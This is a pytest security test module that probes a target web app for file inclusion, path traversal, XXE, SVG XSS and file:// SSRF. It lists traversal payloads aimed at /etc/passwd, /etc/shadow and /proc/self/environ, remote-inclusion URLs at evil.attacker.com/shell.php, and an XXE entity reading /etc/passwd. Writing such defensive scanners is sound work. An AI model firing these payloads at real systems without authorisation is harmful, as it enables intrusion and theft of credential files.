"""Category 16: File & Resource Handling — LFI, RFI, path traversal, XXE probes."""
import re
import pytest

from tests.active.helpers import safe_get, safe_post, url_join
from tests.active.config import TARGET_URL

UNIX_PASSWD = re.compile(r"root:[x*]:\d+:\d+")
WINDOWS_SYSTEM32 = re.compile(r"\[boot loader\]|\[operating systems\]|WINNT")

FILE_PARAMS = ["file", "page", "include", "path", "doc", "document",
               "template", "load", "read", "view", "resource", "source"]

LFI_PAYLOADS = [
    "../../../../etc/passwd",
    "../../../../etc/shadow",
    "..\\..\\..\\..\\windows\\win.ini",
    "../../../../proc/self/environ",
    "/etc/passwd",
    "....//....//....//etc/passwd",
    "/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
    "file:///etc/passwd",
]

RFI_PAYLOADS = [
    "http://evil.attacker.com/shell.php",
    "https://evil.attacker.com/shell.txt",
    "//evil.attacker.com/shell.php",
    "ftp://evil.attacker.com/shell.php",
]

DOWNLOAD_PATHS = ["/download", "/files", "/file", "/attachment",
                  "/export", "/media", "/content", "/static"]


class TestLocalFileInclusion:
    def test_lfi_via_file_param(self):
        for param in FILE_PARAMS:
            for payload in LFI_PAYLOADS[:4]:
                r = safe_get(f"{TARGET_URL}?{param}={payload}")
                if r is None:
                    continue
                if UNIX_PASSWD.search(r.text) or WINDOWS_SYSTEM32.search(r.text):
                    pytest.fail(
                        f"LFI via ?{param}={payload!r}: sensitive file content in response"
                    )

    def test_lfi_url_encoded_traversal(self):
        for param in FILE_PARAMS[:4]:
            r = safe_get(f"{TARGET_URL}?{param}=/%2e%2e/%2e%2e/%2e%2e/etc/passwd")
            if r and UNIX_PASSWD.search(r.text):
                pytest.fail(f"LFI via URL-encoded traversal in ?{param}")

    def test_lfi_proc_self_environ(self):
        for param in FILE_PARAMS[:4]:
            r = safe_get(f"{TARGET_URL}?{param}=../../../../proc/self/environ")
            if r and "HTTP_HOST" in r.text:
                pytest.fail(
                    f"LFI to /proc/self/environ via ?{param}: environment variables exposed"
                )


class TestRemoteFileInclusion:
    def test_rfi_url_param_blocked(self):
        for param in FILE_PARAMS[:4]:
            for payload in RFI_PAYLOADS[:2]:
                r = safe_get(f"{TARGET_URL}?{param}={payload}")
                if r is None:
                    continue
                if r.status_code == 200 and len(r.text) > 200:
                    # Check if external content was fetched (very heuristic)
                    if "evil.attacker.com" in r.text or "shell" in r.text.lower():
                        pytest.fail(
                            f"RFI: ?{param}={payload!r} fetched external content"
                        )


class TestPathTraversalInDownload:
    def test_file_download_no_traversal(self):
        for base_path in DOWNLOAD_PATHS:
            traversal_attempts = [
                url_join(base_path) + "?file=../../../../etc/passwd",
                url_join(base_path) + "?name=../../../etc/passwd",
                url_join(base_path) + "/../../../etc/passwd",
            ]
            for attempt_url in traversal_attempts:
                r = safe_get(attempt_url, allow_redirects=False)
                if r and UNIX_PASSWD.search(r.text):
                    pytest.fail(f"Path traversal in file download at {attempt_url}")


class TestSvgXssSsrf:
    def test_svg_file_not_served_inline(self):
        # Check if SVG uploads are served with inline content-type allowing XSS
        for path in ["/uploads", "/media", "/static", "/files"]:
            r = safe_get(url_join(path + "/test.svg"), allow_redirects=False)
            if r is None or r.status_code == 404:
                continue
            ct = r.headers.get("Content-Type", "")
            if "image/svg" in ct and "xml" in ct and r.status_code == 200:
                pytest.fail(
                    f"SVG files served as image/svg+xml at {path}/test.svg — "
                    "inline SVG can execute JavaScript"
                )

    def test_svg_content_type_is_attachment(self):
        for path in ["/uploads", "/media", "/static", "/files"]:
            r = safe_get(url_join(path + "/sample.svg"), allow_redirects=False)
            if r is None or r.status_code != 200:
                continue
            ct = r.headers.get("Content-Type", "")
            cd = r.headers.get("Content-Disposition", "")
            if "svg" in ct and "attachment" not in cd:
                pytest.fail(
                    f"SVG file at {path}/sample.svg not served as attachment — "
                    "inline rendering enables SVG XSS"
                )


class TestXxeViaXmlEndpoints:
    def test_xxe_probe_no_file_disclosure(self):
        xxe = (
            '<?xml version="1.0"?>'
            '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
            '<root><data>&xxe;</data></root>'
        )
        for path in ["/api/xml", "/xml", "/import", "/upload", "/parse",
                     "/api/v1/import", "/api/import"]:
            r = safe_post(url_join(path), data=xxe,
                          headers={"Content-Type": "application/xml"})
            if r and r.status_code == 200 and UNIX_PASSWD.search(r.text):
                pytest.fail(
                    f"XXE injection at {path}: /etc/passwd content in response"
                )


class TestSsrfViaFileFetch:
    def test_file_fetch_params_blocked(self):
        for param in FILE_PARAMS:
            for payload in ["file:///etc/passwd", "file:///c:/windows/win.ini"]:
                r = safe_get(f"{TARGET_URL}?{param}={payload}")
                if r and (UNIX_PASSWD.search(r.text) or WINDOWS_SYSTEM32.search(r.text)):
                    pytest.fail(
                        f"SSRF via file:// URI in ?{param}: local file content exposed"
                    )


# Tests requiring upload endpoints
class TestFileHandlingSkipped:
    def test_zip_slip_requires_upload_endpoint(self):
        pytest.skip("Zip slip requires a file upload endpoint that processes archives.")

    def test_xxe_in_docx_xlsx_requires_upload(self):
        pytest.skip("XXE in DOCX/XLSX requires a file upload/processing endpoint.")
